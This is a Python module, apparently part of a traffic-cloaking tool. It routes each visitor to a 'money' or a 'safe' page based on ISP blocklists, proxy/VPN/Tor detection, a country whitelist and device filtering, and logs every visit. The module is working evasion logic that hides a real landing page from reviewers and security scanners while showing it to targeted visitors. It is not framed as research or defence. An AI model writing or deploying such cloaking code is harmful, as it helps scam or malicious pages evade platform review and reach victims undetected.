"""
Decision engine: looks up the flow by domain, evaluates visitor IP + UA,
decides money or safe page.

Decision order:
  1. Blocked ISP       → safe
  2. Proxy / VPN / TOR → safe
  3. Country not in whitelist → safe
  4. Device filtered   → safe
  5. All clear         → money
"""
from core import ipgeo, proxycheck
from core.useragent import parse as parse_ua, is_allowed as device_allowed
from db.models import flow_get_by_domain, visit_log


class FlowResult:
    __slots__ = ("action", "redirect_url", "ip_info", "proxy", "device_type", "os", "flow_name")

    def __init__(self, action, redirect_url, ip_info, proxy, device_type="", os="", flow_name=""):
        self.action       = action
        self.redirect_url = redirect_url
        self.ip_info      = ip_info
        self.proxy        = proxy
        self.device_type  = device_type
        self.os           = os
        self.flow_name    = flow_name


def evaluate(domain: str, token: str, ip: str, user_agent: str = "") -> FlowResult:
    row = flow_get_by_domain(domain)
    if not row:
        return FlowResult("safe", "", {}, False)

    flow_name = row["flow_name"]
    safe_url  = row["safe_url"]  or ""
    money_url = row["money_url"] or safe_url

    # 1. Geo lookup
    geo          = ipgeo.lookup(ip)
    country_code = geo.get("country_code", "")
    isp          = geo.get("isp", "")

    # 2. Blocked ISP
    blocked_isps = [x.strip() for x in (row["blocked_isps"] or "").split("|") if x.strip()]
    if any(b.lower() in isp.lower() for b in blocked_isps):
        _log(flow_name, domain, token, ip, geo, "safe", False, "unknown", "other")
        return FlowResult("safe", safe_url, geo, False, "unknown", "other", flow_name)

    # 3. Proxy / VPN / TOR
    proxy_info = proxycheck.check(ip)
    proxy      = proxy_info.get("proxy", False)
    if proxy:
        _log(flow_name, domain, token, ip, geo, "safe", True, "unknown", "other")
        return FlowResult("safe", safe_url, geo, True, "unknown", "other", flow_name)

    # 4. Country whitelist
    allowed = [c.strip().upper() for c in (row["countries"] or "").split(",") if c.strip()]
    if allowed and country_code.upper() not in allowed:
        _log(flow_name, domain, token, ip, geo, "safe", False, "unknown", "other")
        return FlowResult("safe", safe_url, geo, False, "unknown", "other", flow_name)

    # 5. Device filter
    ua_result     = parse_ua(user_agent)
    device_filter = row["device_filter"] or "all"
    if not device_allowed(ua_result, device_filter):
        _log(flow_name, domain, token, ip, geo, "safe", False, ua_result.device_type, ua_result.os)
        return FlowResult("safe", safe_url, geo, False, ua_result.device_type, ua_result.os, flow_name)

    # 6. Money
    _log(flow_name, domain, token, ip, geo, "money", False, ua_result.device_type, ua_result.os)
    return FlowResult("money", money_url, geo, False, ua_result.device_type, ua_result.os, flow_name)


def _log(flow_name, domain, token, ip, geo, action, proxy, device_type, os):
    visit_log(
        flow_name=flow_name,
        domain=domain,
        token=token,
        ip=ip,
        country=geo.get("country", ""),
        country_code=geo.get("country_code", ""),
        isp=geo.get("isp", ""),
        action=action,
        proxy=proxy,
        device_type=device_type,
        os=os,
    )
